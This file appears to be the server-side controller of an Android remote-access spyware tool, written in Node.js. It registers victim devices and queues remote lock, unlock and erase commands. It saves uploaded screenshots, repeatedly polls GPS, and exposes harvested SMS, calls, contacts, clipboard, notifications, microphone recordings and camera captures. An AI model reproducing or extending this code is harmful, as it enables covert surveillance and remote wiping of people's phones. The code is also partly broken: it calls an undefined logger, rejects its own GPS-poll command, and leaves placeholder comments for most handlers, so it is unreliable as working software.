const CONST = require('./const');
const fs = require('fs');
const crypto = require('crypto');
const path = require('path');

class Clients {
    constructor(db) {
        this.clientConnections = {};
        this.gpsPollers = {};
        this.clientDatabases = {};
        this.ignoreDisconnects = {};
        this.instance = this;
        this.db = db;
    }

    // UPDATE

    clientConnect(connection, clientID, clientData) {
        this.clientConnections[clientID] = connection;

        this.ignoreDisconnects[clientID] = clientID in this.ignoreDisconnects;

        console.log("Connected -> should ignore?", this.ignoreDisconnects[clientID]);

        let client = this.db.maindb.get('clients').find({ clientID }).value();
        if (client === undefined) {
            this.db.maindb.get('clients').push({
                clientID,
                firstSeen: new Date(),
                lastSeen: new Date(),
                isOnline: true,
                dynamicData: clientData
            }).write();
        } else {
            this.db.maindb.get('clients').find({ clientID }).assign({
                lastSeen: new Date(),
                isOnline: true,
                dynamicData: clientData
            }).write();
        }

        let clientDatabase = this.getClientDatabase(clientID);
        this.setupListeners(clientID, clientDatabase);
    }

    clientDisconnect(clientID) {
        console.log("Disconnected -> should ignore?", this.ignoreDisconnects[clientID]);

        if (!this.ignoreDisconnects[clientID]) {
            logManager.log(CONST.logTypes.info, clientID + " Disconnected");
            this.db.maindb.get('clients').find({ clientID }).assign({
                lastSeen: new Date(),
                isOnline: false,
            }).write();

            delete this.clientConnections[clientID];
            clearInterval(this.gpsPollers[clientID]);
        }

        delete this.ignoreDisconnects[clientID];
    }

    getClientDatabase(clientID) {
        if (!this.clientDatabases[clientID]) {
            this.clientDatabases[clientID] = new this.db.clientdb(clientID);
        }
        return this.clientDatabases[clientID];
    }

    setupListeners(clientID, clientDatabase) {
        let socket = this.clientConnections[clientID];

        logManager.log(CONST.logTypes.info, clientID + " Connected");

        socket.on('disconnect', () => this.clientDisconnect(clientID));

        // Run the queued requests for this client
        let clientQue = clientDatabase.get('CommandQue').value();
        if (clientQue.length !== 0) {
            logManager.log(CONST.logTypes.info, clientID + " Running Queued Commands");
            clientQue.forEach((command) => {
                let uid = command.uid;
                this.sendCommand(clientID, command.type, command, (error) => {
                    if (!error) clientDatabase.get('CommandQue').remove({ uid }).write();
                    else {
                        logManager.log(CONST.logTypes.error, clientID + " Queued Command (" + command.type + ") Failed");
                    }
                });
            });
        }

        // Start GPS polling (if enabled)
        this.gpsPoll(clientID);

        socket.on(CONST.messageKeys.screenShot, (data) => {
            if (data.image) {
                logManager.log(CONST.logTypes.info, "Recieving " + data.name + " from " + clientID);

                let epoch = Date.now().toString();
                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
                let fileKey = `${hash.substr(0, 5)}-${hash.substr(5, 4)}-${hash.substr(9, 5)}`;
                let fileExt = (data.name.substring(data.name.lastIndexOf("."))).length !== data.name.length ? data.name.substring(data.name.lastIndexOf(".")) : '.unknown';
                let filePath = path.join(CONST.downloadsFullPath, `${fileKey}${fileExt}`);

                fs.writeFile(filePath, Buffer.from(data.buffer, "base64"), (error) => {
                    if (!error) {
                        clientDatabase.get('downloads').push({
                            "time": epoch,
                            "type": "screenShot",
                            "originalName": data.name,
                            "path": `${CONST.downloadsFolder}/${fileKey}${fileExt}`
                        }).write();
                    }
                    else console.error(error);
                });
            }
        });

        // Add more socket event listeners here...

        // Example:
        // socket.on(CONST.messageKeys.files, (data) => {
        //     // Handle files message
        // });

        // Example:
        // socket.on(CONST.messageKeys.call, (data) => {
        //     // Handle call message
        // });

        // Example:
        // socket.on(CONST.messageKeys.sms, (data) => {
        //     // Handle sms message
        // });

        // Add more socket event listeners as needed

        // End of socket event listeners

    }

    // GET

    getClient(clientID) {
        return this.db.maindb.get('clients').find({ clientID }).value() || false;
    }

    getClientList() {
        return this.db.maindb.get('clients').value();
    }

    getClientListOnline() {
        return this.db.maindb.get('clients').filter({ isOnline: true }).value();
    }

    getClientListOffline() {
        return this.db.maindb.get('clients').filter({ isOnline: false }).value();
    }

    getClientDataByPage(clientID, page, filter = undefined) {
        let client = this.db.maindb.get('clients').find({ clientID }).value();
        if (client !== undefined) {
            let clientDB = this.getClientDatabase(client.clientID);
            let clientData = clientDB.value();

            switch (page) {
                case "calls":
                    let callData = clientDB.get('CallData').sortBy('date').reverse().value();
                    if (filter) {
                        callData = callData.filter(call => call.phoneNo.substr(-6) === filter.substr(-6));
                    }
                    return callData;

                case "sms":
                    let smsData = clientData.SMSData;
                    if (filter) {
                        smsData = smsData.filter(sms => sms.address.substr(-6) === filter.substr(-6));
                    }
                    return smsData;

                case "notifications":
                    let notificationData = clientDB.get('notificationLog').sortBy('postTime').reverse().value();
                    if (filter) {
                        notificationData = notificationData.filter(not => not.appName === filter);
                    }
                    return notificationData;

                case "wifi":
                    return {
                        now: clientData.wifiNow,
                        log: clientData.wifiLog
                    };

                case "contacts":
                    return clientData.contacts;

                case "permissions":
                    return clientData.enabledPermissions;

                case "clipboard":
                    return clientDB.get('clipboardLog').sortBy('time').reverse().value();

                case "apps":
                    return clientData.apps;

                case "files":
                    return clientData.currentFolder;

                case "downloads":
                    return clientData.downloads.filter(download => download.type === "download");

                case "microphone":
                    return clientDB.get('downloads').value().filter(download => download.type === "voiceRecord");

                case "gps":
                    return clientData.GPSData;

                case "info":
                    return client;

                case "lockdevice":
                    return clientData.lockDevice;

                case "screenshot":
                    return clientDB.get('downloads').value().filter(download => download.type === "screenShot");

                case "screenrecord":
                    return clientDB.get('downloads').value().filter(download => download.type === "screenRecord");

                case "rearcam":
                    return clientDB.get('downloads').value().filter(download => download.type === "rearCam");

                case "frontcam":
                    return clientDB.get('downloads').value().filter(download => download.type === "frontCam");

                default:
                    return false;
            }
        } else {
            return false;
        }
    }

    // DELETE

    deleteClient(clientID) {
        this.db.maindb.get('clients').remove({ clientID }).write();
        delete this.clientConnections[clientID];
    }

    // COMMAND

    sendCommand(clientID, commandID, commandPayload = {}, cb = () => { }) {
        this.checkCorrectParams(commandID, commandPayload, (error) => {
            if (!error) {
                let client = this.db.maindb.get('clients').find({ clientID }).value();
                if (client !== undefined) {
                    commandPayload.type = commandID;
                    if (clientID in this.clientConnections) {
                        let socket = this.clientConnections[clientID];
                        logManager.log(CONST.logTypes.info, `Requested ${commandID} From ${clientID}`);
                        socket.emit('order', commandPayload);
                        return cb(false, 'Requested');
                    } else {
                        this.queCommand(clientID, commandPayload, (error) => {
                            if (!error) return cb(false, 'Command queued (device is offline)');
                            else return cb(error, undefined);
                        });
                    }
                } else return cb('Client Doesn\'t exist!', undefined);
            } else return cb(error, undefined);
        });
    }

    queCommand(clientID, commandPayload, cb) {
        let clientDB = this.getClientDatabase(clientID);
        let commandQue = clientDB.get('CommandQue');
        let outstandingCommands = commandQue.value().map(command => command.type);

        if (outstandingCommands.includes(commandPayload.type)) {
            return cb('A similar command has already been queued');
        } else {
            commandPayload.uid = Math.floor(Math.random() * 10000);
            commandQue.push(commandPayload).write();
            logManager.log(CONST.logTypes.info, `Queued ${commandPayload.type} For ${clientID}`);
            return cb(false);
        }
    }

    checkCorrectParams(commandID, commandPayload, cb) {
        switch (commandID) {
            case CONST.messageKeys.lock:
                return cb(false);

            case CONST.messageKeys.unlock:
                return cb(false);

            case CONST.messageKeys.erase:
                return cb(false);

            default:
                return cb('Unrecognized Command: ' + commandID);
        }
    }

    gpsPoll(clientID) {
        let clientDB = this.getClientDatabase(clientID);

        this.gpsPollers[clientID] = setInterval(() => {
            let lastGPS = clientDB.get('GPSData').sortBy('date').reverse().value()[0];
            if (lastGPS !== undefined) {
                let now = new Date();
                if (lastGPS.date < now.getTime() - (CONST.gpsInterval * 1000)) {
                    this.sendCommand(clientID, CONST.messageKeys.gpsPoll, { until: now.getTime() + (CONST.gpsInterval * 1000) });
                }
            }
        }, CONST.gpsInterval * 1000);
    }
}

module.exports = Clients;
